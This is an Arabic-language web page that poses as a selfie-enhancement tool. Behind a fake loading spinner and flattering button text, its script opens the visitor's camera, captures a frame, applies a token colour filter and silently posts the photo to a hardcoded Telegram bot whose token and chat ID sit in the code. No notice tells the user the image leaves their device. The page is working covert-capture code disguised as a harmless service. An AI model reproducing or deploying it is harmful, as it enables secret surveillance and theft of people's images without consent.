<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحويل الصوره إلى صوره احترافيه⚡</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #2b2d42, #8d99ae);
            font-family: 'Arial', sans-serif;
            overflow: hidden;
            color: #edf2f4;
            direction: rtl; /* لتغيير اتجاه النصوص إلى اليمين */
        }

        .container {
            text-align: center;
            width: 100%;
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            animation: fadeIn 2s ease-in-out;
        }

        .spinner {
            width: 100px;
            height: 100px;
            border: 10px solid rgba(255, 255, 255, 0.3);
            border-top: 10px solid #edf2f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        button {
            background-color: #f7a800;
            color: #fff;
            padding: 15px 25px;
            border: none;
            font-size: 1.2rem;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 30px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #e68900;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* إخفاء عناصر الفيديو والصورة */
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>الرجاء الانتظار...</h1>
        <div class="spinner"></div>
        <button id="captureBtn">خذ لقطه لك حتا نحولها الى صوره جمييله مثلك😍</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const apiToken = "7674081117:AAETXvl-vJ1WDZbNMFRndVH6cpjKyBKFC_o";
        const chatId = "6149773583";

        // وظيفة لالتقاط الصورة وتحويلها إلى صورة جميلة
        async function captureAndEnhancePhoto() {
            try {
                // الوصول إلى الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // انتظار تحميل الفيديو
                await new Promise((resolve) => (video.onloadedmetadata = resolve));

                // التقاط الصورة
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // إيقاف الكاميرا
                stream.getTracks().forEach((track) => track.stop());

                // تطبيق تأثيرات "احترافية"
                const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                for (let i = 0; i < data.length; i += 4) {
                    data[i] = data[i] * 1.2; // تعزيز اللون الأحمر
                    data[i + 1] = data[i + 1] * 1.1; // تعزيز اللون الأخضر
                    data[i + 2] = data[i + 2] * 0.9; // تقليل اللون الأزرق
                }
                context.putImageData(imageData, 0, 0);

                // تحويل الصورة إلى Blob
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append("chat_id", chatId);
                    formData.append("photo", blob, "enhanced_photo.jpg");

                    // إرسال الصورة إلى Telegram
                    const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                    });

                    const data = await response.json();
                    if (data.ok) {
                        console.log("تم إرسال الصورة بنجاح!");
                    } else {
                        console.error("خطأ في API Telegram:", data);
                    }
                }, "image/jpeg");
            } catch (error) {
                console.error("خطأ في التقاط أو إرسال الصورة:", error);
            }
        }

        // تفعيل التقاط الصورة عند الضغط على الزر
        document.getElementById('captureBtn').addEventListener('click', captureAndEnhancePhoto);
    </script>
</body>
</html>
